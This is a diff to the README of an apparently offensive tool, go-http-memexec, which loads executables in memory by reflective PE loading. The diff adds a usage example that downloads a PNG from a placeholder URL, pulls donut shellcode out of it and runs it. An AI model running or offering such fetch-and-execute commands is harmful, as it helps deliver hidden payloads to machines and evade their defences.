@@ -52,6 +52,9 @@ go http memexec uses a sophisticated reflective PE loading technique to run exec
 
 # Extract and execute PE from PNG image
 ./go-http-memexec -image https://example.com/payload.png
+
+# Extract and execute donut shellcode from PNG image
+./go-http-memexec -image -shellcode https://example.com/payload.png
 ```
 
 ## Use Cases
